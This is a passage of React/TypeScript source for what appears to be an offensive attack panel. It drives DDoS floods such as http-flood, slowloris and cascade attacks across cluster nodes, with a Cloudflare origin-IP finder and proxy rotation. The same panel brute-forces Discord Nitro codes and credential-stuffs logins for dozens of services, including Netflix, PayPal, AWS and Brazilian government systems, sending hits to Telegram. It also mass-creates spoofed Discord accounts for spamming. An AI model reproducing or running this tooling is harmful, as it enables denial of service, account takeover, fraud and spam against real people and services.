          animationDelay: `${i * 0.35}s`,
          animationDuration: `${2.4 + (i % 3) * 0.5}s`,
          width:  `${1 + (i % 3)}px`,
          height: `${1 + (i % 3)}px`,
          background: i % 2 === 0 ? "rgba(192,57,43,0.85)" : "rgba(212,175,55,0.7)",
          boxShadow: i % 2 === 0 ? "0 0 4px rgba(192,57,43,0.8)" : "0 0 4px rgba(212,175,55,0.7)",
        }} />
      ))}
    </div>
  );
}

/* ── Panel ── */
function Panel() {
  /* Config state — all persisted to localStorage */
  const [target, setTarget]       = useState(() => localStorage.getItem("lb-target") ?? "");
  const [method, setMethod]       = useState(() => localStorage.getItem("lb-method") ?? "http-flood");
  const [packetSize, setPacketSize] = useState(() => Number(localStorage.getItem("lb-packet-size")) || 64);
  const [duration, setDuration]   = useState(() => Number(localStorage.getItem("lb-duration"))     || 60);
  const [delay, setDelay]         = useState(() => Number(localStorage.getItem("lb-delay"))        || 100);
  const [threads, setThreads]     = useState(() => Number(localStorage.getItem("lb-threads"))      || 16);
  const [webhookUrl, setWebhookUrl] = useState(() => localStorage.getItem("lb-webhook-url") ?? "");
  const [showWebhook, setShowWebhook] = useState(() => localStorage.getItem("lb-show-webhook") === "1");

  /* Multi-target */
  const [extraTargets, setExtraTargets] = useState<[string, string]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-extra-targets") || "[\"\",\"\"]") as [string, string]; }
    catch { return ["", ""]; }
  });
  const [showMultiTarget, setShowMultiTarget] = useState(() => localStorage.getItem("lb-show-multi") === "1");
  const [extraAttackIds, setExtraAttackIds] = useState<(number | null)[]>([]);

  /* Attack state */
  const [currentAttackId, setCurrentAttackId] = useState<number | null>(null);
  const [isRunning, setIsRunning] = useState(false);
  const [progress, setProgress]  = useState(0);

  /* Live metrics */
  const [pps, setPps]            = useState(0);
  const [bps, setBps]            = useState(0);
  const [peakPps, setPeakPps]    = useState(0);
  const [peakBps, setPeakBps]    = useState(0);
  const [ppsHistory, setPpsHistory] = useState<number[]>([]);
  const [bpsHistory, setBpsHistory] = useState<number[]>([]);
  const [latencyHistory, setLatencyHistory] = useState<number[]>([]);
  const [lastAtkPkts,  setLastAtkPkts]  = useState(0);
  const [lastAtkBytes, setLastAtkBytes] = useState(0);
  const peakPpsRef = useRef(0);
  const peakBpsRef = useRef(0);
  const lastPacketsRef = useRef(0);
  const lastBytesRef   = useRef(0);
  const currentPacketsRef = useRef(0);
  const currentBytesRef   = useRef(0);
  // Client-side PPS calculation refs — avoids server-side timer drift
  const prevLivePktsRef   = useRef<number | null>(null);
  const prevLiveBytesRef  = useRef<number | null>(null);
  const prevLivePollMs    = useRef<number | null>(null);
  const emaPpsRef         = useRef(0);
  const emaBpsRef         = useRef(0);

  /* Target input shake feedback */
  const [targetShake, setTargetShake] = useState(false);
  function shakeTarget() {
    setTargetShake(true);
    setTimeout(() => setTargetShake(false), 600);
  }

  /* Target monitoring */
  const [targetStatus, setTargetStatus] = useState<"unknown" | "online" | "offline">("unknown");
  const targetStatusRef   = useRef<"unknown" | "online" | "offline">("unknown");
  const consecutiveFailsRef = useRef(0);
  const CONSECUTIVE_FAILS_TO_CONFIRM = 3;

  /* UI state */
  const [logs, setLogs]             = useState<LogEntry[]>([mkLog("Awaiting Geass command...", "info")]);
  const [soundEnabled, setSoundEnabled] = useState(() => localStorage.getItem("lb-sound") !== "0");
  const soundRef = useRef(true);

  /* Favorites (plain URLs) */
  const [favorites, setFavorites] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-favorites") || "[]"); } catch { return []; }
  });

  /* Named targets */
  const [namedTargets, setNamedTargets] = useState<NamedTarget[]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-named-targets") || "[]"); } catch { return []; }
  });
  const [showNamedTargets, setShowNamedTargets] = useState(false);
  const [newNameLabel, setNewNameLabel] = useState("");

  /* Custom user presets */
  const [userPresets, setUserPresets] = useState<UserPreset[]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-user-presets") || "[]"); } catch { return []; }
  });
  const [showCustomPresets, setShowCustomPresets] = useState(false);
  const [newPresetLabel, setNewPresetLabel] = useState("");

  /* Smart cluster LB */
  const [smartLB, setSmartLB] = useState(() => localStorage.getItem("lb-smart-lb") !== "0");

  const [showFavs, setShowFavs]     = useState(false);
  const [showHistory, setShowHistory] = useState(false);
  const [entered, setEntered]       = useState(false);

  /* Cluster mode */
  const [clusterNodes, setClusterNodes] = useState<string[]>(() => {
    try {
      const saved = JSON.parse(localStorage.getItem("lb-cluster-nodes") || "[]") as string[];
      if (saved.length > 0) return saved;
      const envNodes = ((import.meta.env.VITE_CLUSTER_NODES as string) ?? "")
        .split(",").map(s => s.trim()).filter(Boolean);
      if (envNodes.length > 0) localStorage.setItem("lb-cluster-nodes", JSON.stringify(envNodes));
      return envNodes;
    } catch { return []; }
  });
  const [clusterInput,      setClusterInput]      = useState("");
  const [showCluster,       setShowCluster]        = useState(false);
  const [clusterAttackIds,  setClusterAttackIds]   = useState<{node: string; id: number; assignedMethod: string}[]>([]);
  const [clusterTotalPkts,  setClusterTotalPkts]   = useState(0);
  const [clusterTotalBytes, setClusterTotalBytes]  = useState(0);

  /* Node health monitoring */
  interface NodeHealth { url: string; online: boolean; latencyMs: number; cpus?: number; freeMem?: number; }
  const [nodeHealth, setNodeHealth] = useState<NodeHealth[]>([]);

  /* Active page */
  const [activePage, setActivePage] = useState<"attack" | "checker" | "dns" | "discord" | "nitro">(() =>
    (localStorage.getItem("lb-active-page") as "attack" | "checker" | "dns" | "discord" | "nitro") ?? "attack"
  );

  /* ── Nitro Generator ── */
  const [nitroRunning,    setNitroRunning]    = useState(false);
  const [nitroBatch,      setNitroBatch]      = useState(10);
  const [nitroType,       setNitroType]       = useState<"classic" | "boost" | "both">("both");
  const [nitroTotal,      setNitroTotal]      = useState(0);
  const [nitroValid,      setNitroValid]      = useState(0);
  const [nitroInvalid,    setNitroInvalid]    = useState(0);
  const [nitroRL,         setNitroRL]         = useState(0);
  const [nitroErrors,     setNitroErrors]     = useState(0);
  const [nitroCycles,     setNitroCycles]     = useState(0);
  const [nitroStartTime,  setNitroStartTime]  = useState(0);
  const [nitroLastCycle,  setNitroLastCycle]  = useState(0);
  const [nitroHits,       setNitroHits]       = useState<{ code: string; plan: string; at: number }[]>([]);
  const [nitroLogs,       setNitroLogs]       = useState<{ text: string; type: "info" | "success" | "error" | "warn" }[]>([]);
  const nitroLoopRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const nitroRunRef  = useRef(false);

  const NITRO_CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
  const genNitroCodePanel = (len: number) => {
    let out = "";
    for (let i = 0; i < len; i++) out += NITRO_CHARS[Math.floor(Math.random() * NITRO_CHARS.length)];
    return out;
  };

  const nitroLog = useCallback((text: string, type: "info" | "success" | "error" | "warn" = "info") => {
    setNitroLogs(prev => [...prev.slice(-199), { text, type }]);
  }, []);

  const startNitroGenerator = useCallback(() => {
    nitroRunRef.current = true;
    setNitroRunning(true);
    setNitroStartTime(Date.now());
    setNitroTotal(0); setNitroValid(0); setNitroInvalid(0);
    setNitroRL(0); setNitroErrors(0); setNitroCycles(0); setNitroHits([]);
    nitroLog(`⚡ Gerador iniciado — ${nitroBatch} códigos/ciclo — tipo: ${nitroType}`, "info");

    const runCycle = async () => {
      if (!nitroRunRef.current) return;
      const codes: string[] = [];
      const bs = nitroBatch;
      const ct = nitroType;
      for (let i = 0; i < bs; i++) {
        if (ct === "classic")    codes.push(genNitroCodePanel(16));
        else if (ct === "boost") codes.push(genNitroCodePanel(24));
        else codes.push(genNitroCodePanel(i % 2 === 0 ? 16 : 24));
      }

      nitroLog(`🔄 Ciclo iniciado — verificando ${bs} códigos...`, "info");
      try {
        const resp = await fetch(`${BASE}/api/nitro/check`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ codes }),
          signal: AbortSignal.timeout(bs * 12_000 + 30_000),
        });
        if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
        const data = await resp.json() as {
          results: { code: string; status: string; plan?: string }[];
          proxyCount: number;
        };
        let batchValid = 0, batchInvalid = 0, batchRL = 0, batchErr = 0;
        const newHits: { code: string; plan: string; at: number }[] = [];
        for (const r of data.results) {
          if (r.status === "valid") {
            batchValid++;
            newHits.push({ code: r.code, plan: r.plan ?? "Nitro", at: Date.now() });
            nitroLog(`🎁 HIT! ${r.code} — ${r.plan ?? "Nitro"}`, "success");
          } else if (r.status === "invalid") {
            batchInvalid++;
          } else if (r.status === "rate_limited") {
            batchRL++;
          } else {
            batchErr++;
          }
        }
        setNitroTotal(t => t + bs);
        setNitroValid(v => v + batchValid);
        setNitroInvalid(i => i + batchInvalid);
        setNitroRL(r => r + batchRL);
        setNitroErrors(e => e + batchErr);
        setNitroCycles(c => c + 1);
        setNitroLastCycle(Date.now());
        if (newHits.length > 0) setNitroHits(prev => [...prev, ...newHits].slice(-50));
        nitroLog(`✅ Ciclo concluído — válidos: ${batchValid} | inválidos: ${batchInvalid} | rl: ${batchRL}`, batchValid > 0 ? "success" : "info");
      } catch (err) {
        nitroLog(`❌ Erro no ciclo: ${String(err).slice(0, 80)}`, "error");
        setNitroErrors(e => e + bs);
      }

      if (nitroRunRef.current) {
        nitroLoopRef.current = setTimeout(() => { void runCycle(); }, 5_000);
      }
    };

    nitroLoopRef.current = setTimeout(() => { void runCycle(); }, 500);
  }, [nitroBatch, nitroType, nitroLog]);

  const stopNitroGenerator = useCallback(() => {
    nitroRunRef.current = false;
    setNitroRunning(false);
    if (nitroLoopRef.current) clearTimeout(nitroLoopRef.current);
    nitroLog("⏹ Gerador parado.", "warn");
  }, [nitroLog]);

  /* DNS Recon */
  const [dnsQuery,   setDnsQuery]   = useState("");
  const [dnsResult,  setDnsResult]  = useState<Record<string, unknown> | null>(null);
  const [dnsLoading, setDnsLoading] = useState(false);
  const [dnsError,   setDnsError]   = useState("");

  /* Discord Guilds */
  interface DiscordGuild { id: string; name: string; icon: string | null; }
  const [discordGuilds,      setDiscordGuilds]      = useState<DiscordGuild[]>([]);
  const [discordLoading,     setDiscordLoading]      = useState(false);
  const [discordError,       setDiscordError]        = useState("");
  const [discordInviteUrl,   setDiscordInviteUrl]    = useState("");
  const [discordAppId,       setDiscordAppId]        = useState("");
  const [discordLeavingId,   setDiscordLeavingId]    = useState<string | null>(null);
  const [discordCopied,      setDiscordCopied]       = useState(false);
  const [discordSubTab,      setDiscordSubTab]       = useState<"bot" | "accounts">("bot");

  /* Discord Account Manager */
  interface DiscordAccount {
    id: string; username: string; discriminator: string;
    avatar: string | null; token: string; addedAt: number; status: "ok" | "invalid" | "unknown";
    email?: string; password?: string; createdAuto?: boolean;
  }
  interface AccActionResult { id?: string; username: string; status?: string; detail?: string; sent?: number; errors?: number; lastError?: string; }
  const [dAccounts,       setDAccounts]       = useState<DiscordAccount[]>([]);
  const [dAccLoading,     setDAccLoading]     = useState(false);
  const [dAccError,       setDAccError]       = useState("");
  const [dAccTokenInput,  setDAccTokenInput]  = useState("");
  const [dAccAdding,      setDAccAdding]      = useState(false);
  const [dAccSelected,    setDAccSelected]    = useState<Set<string>>(new Set());
  const [dAccVerifying,   setDAccVerifying]   = useState(false);

  /* Account Actions — Join */
  const [dJoinCode,       setDJoinCode]       = useState("");
  const [dJoinDelay,      setDJoinDelay]      = useState(1500);
  const [dJoinLoading,    setDJoinLoading]    = useState(false);
  const [dJoinResults,    setDJoinResults]    = useState<AccActionResult[]>([]);

  /* Account Actions — Message */
  const [dMsgChannelId,   setDMsgChannelId]   = useState("");
  const [dMsgText,        setDMsgText]        = useState("");
  const [dMsgCount,       setDMsgCount]       = useState(1);
  const [dMsgDelay,       setDMsgDelay]       = useState(2000);
  const [dMsgLoading,     setDMsgLoading]     = useState(false);
  const [dMsgResults,     setDMsgResults]     = useState<AccActionResult[]>([]);
  const [dActionTab,      setDActionTab]      = useState<"join" | "message">("join");

  const loadDAccounts = () => {
    setDAccLoading(true); setDAccError("");
    fetch(`${BASE}/api/discord/accounts`)
      .then(r => r.json())
      .then((d: { accounts?: DiscordAccount[]; error?: string }) => {
        if (d.accounts) setDAccounts(d.accounts);
        else setDAccError(d.error ?? "Erro ao carregar contas");
      })
      .catch(e => setDAccError(String(e)))
      .finally(() => setDAccLoading(false));
  };

  /* Auto account creation */
  interface CreateAccResult { status: string; username?: string; email?: string; password?: string; detail: string; saved: boolean; }
  const [dCreateCount,      setDCreateCount]      = useState(1);
  const [dCreateService,    setDCreateService]    = useState<"builtin" | "2captcha" | "capmonster">("builtin");
  const [dCreateApiKey,     setDCreateApiKey]     = useState("");
  const [dCreateProxy,      setDCreateProxy]      = useState("");
  const [dAutoProxies,      setDAutoProxies]      = useState<string[]>([]);
  const [dUseResidential,   setDUseResidential]   = useState(false);
  const [dCreateDelay,      setDCreateDelay]      = useState(3000);
  const [dCreateLoading,    setDCreateLoading]    = useState(false);
  const [dFetchingProxy,    setDFetchingProxy]    = useState(false);
  const [dShowMyIPGuide,   setDShowMyIPGuide]   = useState(false);
  const [dCreateResults,    setDCreateResults]    = useState<CreateAccResult[]>([]);
  const [dCreateProgress,   setDCreateProgress]   = useState(0);
  const [dBrowserMode,      setDBrowserMode]      = useState(false);
  const [dHCaptchaModal,    setDHCaptchaModal]    = useState<{ sitekey: string; rqdata?: string } | null>(null);
  const dHCaptchaResolveRef = useRef<((token: string | null) => void) | null>(null);

  /* Site checker */
  const [checkerUrl, setCheckerUrl] = useState("");
  const [checkerResult, setCheckerResult] = useState<CheckResult | null>(null);
  const [isChecking, setIsChecking] = useState(false);

  /* ── Credential Bulk Checker ── */
  type CredCheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita" | "tubehosting" | "hostinger" | "vultr" | "digitalocean" | "linode" | "github" | "aws" | "mercadopago" | "ifood" | "riot" | "hetzner" | "roblox" | "epicgames" | "steam" | "playstation" | "paypal" | "xbox";
  interface CredResult { credential: string; login: string; status: "HIT" | "FAIL" | "ERROR"; detail?: string; }
  const [credTarget, setCredTarget]         = useState<CredCheckerTarget>(
    () => (localStorage.getItem("lb-cred-target") as CredCheckerTarget) ?? "consultcenter"
  );
  const [credText, setCredText]             = useState(() => localStorage.getItem("lb-cred-text") ?? "");
  const [credRunning, setCredRunning]       = useState(false);
  const [credTotal, setCredTotal]           = useState(0);
  const [credDone, setCredDone]             = useState(0);
  const [credHits, setCredHits]             = useState<CredResult[]>([]);
  const [credFailList, setCredFailList]     = useState<CredResult[]>([]);
  const [credErrorList, setCredErrorList]   = useState<CredResult[]>([]);
  const [credFails, setCredFails]           = useState(0);
  const [credErrors, setCredErrors]         = useState(0);
  const [credTab, setCredTab]               = useState<"hit" | "fail" | "error">("hit");
  const [credRecent, setCredRecent]         = useState<CredResult[]>([]);
  const [credSkipped, setCredSkipped]       = useState(0);
  const [credUseCluster, setCredUseCluster] = useState(() => localStorage.getItem("lb-cred-cluster") === "1");
  const [credJobId, setCredJobId]           = useState<string | null>(() => localStorage.getItem("lb-checker-job-id"));
  const [credPaused, setCredPaused]         = useState(false);
  const [wakeLockActive, setWakeLockActive] = useState(false);
  const [credHitFilter, setCredHitFilter]   = useState("");
  const [credFileLimit, setCredFileLimit]   = useState<number>(0); // 0 = unlimited
  const [telegramToken, setTelegramToken]   = useState(() => localStorage.getItem("lb-tg-token") ?? "");
  const [telegramChatId, setTelegramChatId] = useState(() => localStorage.getItem("lb-tg-chat") ?? "");
  const [showTgSettings, setShowTgSettings] = useState(false);
  const credAbortRef                         = useRef<AbortController | null>(null);
  const credJobIdRef                         = useRef<string | null>(null);
  const credFileRef                          = useRef<HTMLInputElement>(null);
  const wakeLockRef                          = useRef<WakeLockSentinel | null>(null);

  function getCheckedCredsKey(t: string) { return `lb-checked-creds-${t}`; }
  function loadCheckedCreds(t: string): Set<string> {
    try { return new Set(JSON.parse(localStorage.getItem(getCheckedCredsKey(t)) ?? "[]") as string[]); }
    catch { return new Set(); }
  }
  function saveCheckedCreds(t: string, s: Set<string>) {
    try { localStorage.setItem(getCheckedCredsKey(t), JSON.stringify([...s].slice(-5000))); } catch {}
  }
  function clearCheckedCreds(t: string) {
    try { localStorage.removeItem(getCheckedCredsKey(t)); } catch {}
  }

  async function acquireWakeLock() {
    if (!("wakeLock" in navigator)) return;
    try {
      wakeLockRef.current = await (navigator as unknown as { wakeLock: { request(type: string): Promise<WakeLockSentinel> } }).wakeLock.request("screen");
      setWakeLockActive(true);
      wakeLockRef.current.addEventListener("release", () => { wakeLockRef.current = null; setWakeLockActive(false); });
    } catch { /* device/browser doesn't support it */ }
  }

  function releaseWakeLock() {
    wakeLockRef.current?.release().catch(() => {});
    wakeLockRef.current = null;
    setWakeLockActive(false);
  }

  async function sendTelegramHit(credential: string, detail: string | undefined, target: string) {
    if (!telegramToken.trim() || !telegramChatId.trim()) return;
    const text = `✅ *HIT ENCONTRADO*\n\`${credential}\`\n🎯 Alvo: *${target}*${detail ? `\n📋 Detalhe: ${detail}` : ""}`;
    try {
      await fetch(`https://api.telegram.org/bot${telegramToken.trim()}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: telegramChatId.trim(), text, parse_mode: "Markdown" }),
        signal: AbortSignal.timeout(8_000),
      });
    } catch { /* ignore errors — don't break the checker */ }
  }

  async function handleCredPause() {
    const jid = credJobIdRef.current;
    if (!jid) return;
    await fetch(`${BASE}/api/checker/${jid}/pause`, { method: "PATCH" }).catch(() => {});
    setCredPaused(true);
  }

  async function handleCredResume() {
    const jid = credJobIdRef.current;
    if (!jid) return;
    await fetch(`${BASE}/api/checker/${jid}/resume`, { method: "PATCH" }).catch(() => {});
    setCredPaused(false);
  }

  /* Analyzer */
  const [analyzeResult, setAnalyzeResult] = useState<AnalyzeResult | null>(null);
  const [isAnalyzing, setIsAnalyzing]   = useState(false);
  const [showAnalyze, setShowAnalyze]   = useState(false);

  /* Origin IP Finder */
  interface OriginFinding { source: string; host: string; ip: string; isCF: boolean; confidence: "high"|"medium"|"low"; }
  interface AsnInfo { asn: number; name: string; country: string; }
interface OriginResult { domain: string; isCloudflare: boolean; originIPs: string[]; asnInfo?: Record<string, AsnInfo>; findings: OriginFinding[]; crtHostsFound: number; tip: string; }
  const [originResult, setOriginResult]   = useState<OriginResult | null>(null);
  const [isFindingOrigin, setIsFindingOrigin] = useState(false);
  const [showOriginFinder, setShowOriginFinder] = useState(false);

  /* Proxy rotation */
  interface ProxyEntry { host: string; port: number; responseMs: number; type?: "http" | "socks5"; }
  interface ResidentialInfo { host: string; port: number; count: number; username?: string; }
  const [proxies, setProxies]             = useState<ProxyEntry[]>([]);
  const [proxyEnabled, setProxyEnabled]   = useState(false);
  const [proxyFetching, setProxyFetching] = useState(false);
  const [showProxyPanel, setShowProxyPanel] = useState(false);
  const [proxyLiveCount, setProxyLiveCount] = useState<number>(0);
  const [proxyIsFetching, setProxyIsFetching] = useState(false);
  const [proxyLastRefresh, setProxyLastRefresh] = useState<number>(0);
  const [residentialInfo, setResidentialInfo] = useState<ResidentialInfo | null>(null);
  const [showResForm, setShowResForm]       = useState(false);
  const [resFormHost, setResFormHost]       = useState("");
  const [resFormPort, setResFormPort]       = useState("8080");
  const [resFormUser, setResFormUser]       = useState("");
  const [resFormPass, setResFormPass]       = useState("");
  const [resFormCount, setResFormCount]     = useState("25");
  const [resSaving, setResSaving]           = useState(false);

  /* Toast notifications */
  const [toasts, setToasts] = useState<Toast[]>([]);

  /* App theme */
  const [theme, setTheme] = useState<AppTheme>(() =>
    (localStorage.getItem("lb-theme") as AppTheme) || "lelouch"
  );

  /* Domain success scores */
  const [domainScores, setDomainScores] = useState<Record<string, DomainScore>>(() => {
    try { return JSON.parse(localStorage.getItem("lb-domain-scores") || "{}"); } catch { return {}; }
  });

  /* Time remaining in current attack */
  const [timeRemaining, setTimeRemaining] = useState(0);

  /* Live active connection counter (slowloris / conn-flood / geass-override) */
  const [activeConns, setActiveConns] = useState(0);

  /* Geass Override launch flash effect */
  const [geassFlash, setGeassFlash] = useState(false);

  /* Cascade attack state */
  const [isCascading, setIsCascading] = useState(false);
  const [cascadePhase, setCascadePhase] = useState(0); // 1=conn-flood, 2=slowloris, 3=waf-bypass

  /* Auto-recon state */
  const [isAutoRecon, setIsAutoRecon] = useState(false);

  /* Attack history — last 10 completed attacks for comparison chart */
  interface AttackHistoryItem { target: string; method: string; pps: number; bytesSent: number; duration: number; ts: number; }
  const [attackHistory, setAttackHistory] = useState<AttackHistoryItem[]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-attack-history") ?? "[]") as AttackHistoryItem[]; }
    catch { return []; }
  });

  /* Attack scheduling */
  const [scheduleTime, setScheduleTime] = useState("");
  const [showSchedule, setShowSchedule] = useState(false);
  const [scheduleLoading, setScheduleLoading] = useState(false);
  const [scheduledList, setScheduledList] = useState<Array<{ id: string; target: string; scheduledAt: string; method: string; status: string }>>([]);

  /* AI Advisor */
  const [aiLoading, setAiLoading]   = useState(false);
  const [aiData,    setAiData]      = useState<Record<string, unknown> | null>(null);
  const [aiError,   setAiError]     = useState<string | null>(null);
  const [showAiModal, setShowAiModal] = useState(false);

  /* Residential proxy count (legacy — now tracked via residentialInfo) */
  const [residentialCount, setResidentialCount] = useState(0);

  /* Refs */
  const terminalRef    = useRef<HTMLDivElement>(null);
  const startTimeRef   = useRef<number | null>(null);
  const durationRef    = useRef(60);
  const isRunningRef   = useRef(false);
  const targetRef      = useRef("");

  /* Queries */
  const { data: methods = [] } = useListMethods();
  const createAttack = useCreateAttack();
  const stopAttack   = useStopAttack();
  const { data: stats, refetch: refetchStats } = useGetAttackStats({
    query: { queryKey: getGetAttackStatsQueryKey(), refetchInterval: 10000 },
  });
  const { data: currentAttack, refetch: refetchAttack } = useGetAttack(
    currentAttackId ?? 0,
    { query: { queryKey: getGetAttackQueryKey(currentAttackId ?? 0), enabled: currentAttackId !== null, refetchInterval: isRunning ? 3000 : false } }
  );
  const { data: allAttacks = [], refetch: refetchHistory } = useListAttacks(
    { query: { queryKey: getListAttacksQueryKey(), refetchInterval: showHistory ? 5000 : false } }
  );

  const addLog = useCallback((text: string, type: LogType = "info") => {
    setLogs(prev => [...prev.slice(-99), mkLog(text, type)]);
  }, []);

  /* ── Toast helper ── */
  const addToast = useCallback((type: Toast["type"], title: string, msg?: string) => {
    const id = Date.now().toString(36) + Math.random().toString(36).slice(2, 5);
    setToasts(prev => [...prev.slice(-3), { id, type, title, msg }]);
    setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 4200);
  }, []);

  /* ── Browser-side Discord account creation ── */
  // Runs entirely in the user's browser → uses their residential IP
  const DISCORD_SUPER_PROPS_B64 = btoa(JSON.stringify({
    os: "Windows", browser: "Chrome", device: "", system_locale: "en-US",
    browser_user_agent: navigator.userAgent,
    browser_version: "136.0.0.0", os_version: "10",
    referrer: "", referring_domain: "", referrer_current: "", referring_domain_current: "",
    release_channel: "stable", client_build_number: 531702, client_event_source: null,
  }));

  const solveCaptchaInBrowser = useCallback((sitekey: string, rqdata?: string): Promise<string | null> => {
    return new Promise(resolve => {
      dHCaptchaResolveRef.current = resolve;
      setDHCaptchaModal({ sitekey, rqdata });
    });
  }, []);

  const browserCreateOneAccount = useCallback(async (): Promise<CreateAccResult> => {
    try {
      // 1. Get temp email directly from GuerrillaEmail (CORS: *)
      const emResp = await fetch("https://api.guerrillamail.com/ajax.php?f=get_email_address");
      if (!emResp.ok) return { status: "error", detail: "Falha ao obter email temporário", saved: false };
      const emData = await emResp.json() as { email_addr?: string; sid_token?: string };
      const email = emData.email_addr ?? "";
      if (!email) return { status: "error", detail: "GuerrillaEmail não retornou endereço", saved: false };

      // 2. Get Discord fingerprint (CORS: allow-origin: origin)
      const fpResp = await fetch("https://discord.com/api/v10/experiments", {
        headers: { "User-Agent": navigator.userAgent, "X-Super-Properties": DISCORD_SUPER_PROPS_B64 },
      });
      const fingerprint = fpResp.headers.get("x-fingerprint") ?? "";

      // 3. Generate credentials
      const adj = ["Shadow","Storm","Night","Dark","Blade","Iron","Ghost","Silver","Void","Ember"];
      const noun = ["Knight","Reaper","Wolf","Hawk","Fox","Raven","Dragon","Titan","Specter","Phantom"];
      const username = adj[Math.floor(Math.random()*adj.length)] + noun[Math.floor(Math.random()*noun.length)] + Math.floor(Math.random()*9999);
      const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%";
      const password = Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
      const year = 1990 + Math.floor(Math.random() * 20);
      const dob = `${year}-${String(Math.floor(Math.random()*12)+1).padStart(2,"0")}-${String(Math.floor(Math.random()*27)+1).padStart(2,"0")}`;

      const basePayload: Record<string, unknown> = {
        username, email, password, date_of_birth: dob, consent: true, fingerprint,
        gift_code_sku_id: null, promotional_email_opt_in: false,
      };
      const baseHeaders: Record<string, string> = {
        "Content-Type": "application/json",
        "User-Agent": navigator.userAgent,
        "X-Super-Properties": DISCORD_SUPER_PROPS_B64,
        "X-Fingerprint": fingerprint,
        "X-Discord-Locale": "en-US",
      };

      // 4. First registration attempt
      const attempt1 = await fetch("https://discord.com/api/v10/auth/register", {
        method: "POST", headers: baseHeaders, body: JSON.stringify(basePayload),
      });
      const body1 = await attempt1.json() as Record<string, unknown>;

      if (body1.token) {
        const token = body1.token as string;
        await fetch(`${BASE}/api/discord/accounts/save-browser`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, email, password }) });
        return { status: "ok", username, email, password, detail: "✅ Conta criada via browser (sem captcha)!", saved: true };
      }

      if (attempt1.status === 429) {
        const retry = (body1.retry_after as number) ?? 120;
        return { status: "error", detail: `Seu IP foi rate-limitado pelo Discord (${Math.ceil(retry)}s). Aguarde e tente novamente.`, saved: false };
      }

      const captchaKeys = body1.captcha_key as string[] | string | undefined;
      const needCaptcha = Array.isArray(captchaKeys)
        ? captchaKeys.some((k: string) => k.includes("captcha"))
        : typeof captchaKeys === "string" && captchaKeys.includes("captcha");

      if (needCaptcha || body1.captcha_sitekey) {
        const sitekey = (body1.captcha_sitekey as string) ?? "a9b5fb07-92ff-493f-86fe-352a2803b3df";
        const rqdata = body1.captcha_rqdata as string | undefined;
        addLog(`🔐 Captcha necessário — resolva o hCaptcha abaixo`, "warn");
        const solution = await solveCaptchaInBrowser(sitekey, rqdata);
        if (!solution) return { status: "error", detail: "Captcha cancelado pelo usuário", saved: false };

        const attempt2 = await fetch("https://discord.com/api/v10/auth/register", {
          method: "POST",
          headers: { ...baseHeaders, "X-Captcha-Key": solution, ...(rqdata ? { "X-Captcha-Rqtoken": rqdata } : {}) },
          body: JSON.stringify({ ...basePayload, captcha_key: solution }),
        });
        const body2 = await attempt2.json() as Record<string, unknown>;
        if (body2.token) {
          const token = body2.token as string;
          await fetch(`${BASE}/api/discord/accounts/save-browser`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, email, password }) });
          return { status: "ok", username, email, password, detail: "✅ Conta criada via browser (captcha manual)!", saved: true };
        }
        return { status: "error", detail: `Falha após captcha: ${body2.message ?? JSON.stringify(body2).slice(0, 80)}`, saved: false };
      }

      const errMsg = body1.message ?? (Array.isArray(body1.email) ? (body1.email as string[])[0] : undefined) ?? JSON.stringify(body1).slice(0, 100);
      return { status: "error", detail: `Registro falhou: ${errMsg}`, saved: false };
    } catch (e) {
      return { status: "error", detail: `Erro: ${String(e)}`, saved: false };
    }
  }, [BASE, DISCORD_SUPER_PROPS_B64, addLog, solveCaptchaInBrowser]);

  /* ── Domain score helper ── */
  const recordDomainScore = useCallback((targetUrl: string, attackMethod: string, success: boolean) => {
    const key = getDomainKey(targetUrl);
    setDomainScores(prev => {
      const curr = prev[key] ?? { total: 0, downed: 0, lastMethod: "", lastSeen: 0 };
      const next: DomainScore = {
        total: curr.total + 1,
        downed: curr.downed + (success ? 1 : 0),
        lastMethod: attackMethod,
        lastSeen: Date.now(),
      };
      const updated = { ...prev, [key]: next };
      localStorage.setItem("lb-domain-scores", JSON.stringify(updated));
      return updated;
    });
  }, []);

  /* ── Persist config to localStorage whenever anything changes ── */
  useEffect(() => {
    const s = (k: string, v: unknown) => { try { localStorage.setItem(k, String(v)); } catch {} };
    const j = (k: string, v: unknown) => { try { localStorage.setItem(k, JSON.stringify(v)); } catch {} };
    s("lb-target",       target);
    s("lb-method",       method);
    s("lb-packet-size",  packetSize);
    s("lb-duration",     duration);
    s("lb-delay",        delay);
    s("lb-threads",      threads);
    s("lb-webhook-url",  webhookUrl);
    s("lb-show-webhook", showWebhook ? "1" : "0");
    j("lb-extra-targets", extraTargets);
    s("lb-show-multi",   showMultiTarget ? "1" : "0");
    s("lb-active-page",  activePage);
    s("lb-cred-target",  credTarget);
    s("lb-cred-text",    credText);
    s("lb-cred-cluster", credUseCluster ? "1" : "0");
    s("lb-sound",        soundEnabled ? "1" : "0");
  }, [target, method, packetSize, duration, delay, threads, webhookUrl, showWebhook,
      extraTargets, showMultiTarget, activePage, credTarget, credText, credUseCluster, soundEnabled]);

  /* ── Theme class on body ── */
  useEffect(() => {
    document.body.classList.toggle("theme-suzaku", theme === "suzaku");
    localStorage.setItem("lb-theme", theme);
  }, [theme]);

  /* ── Time remaining countdown ── */
  useEffect(() => {
    if (!isRunning || startTimeRef.current === null) { setTimeRemaining(0); return; }
    const iv = setInterval(() => {
      const elapsed = (Date.now() - startTimeRef.current!) / 1000;
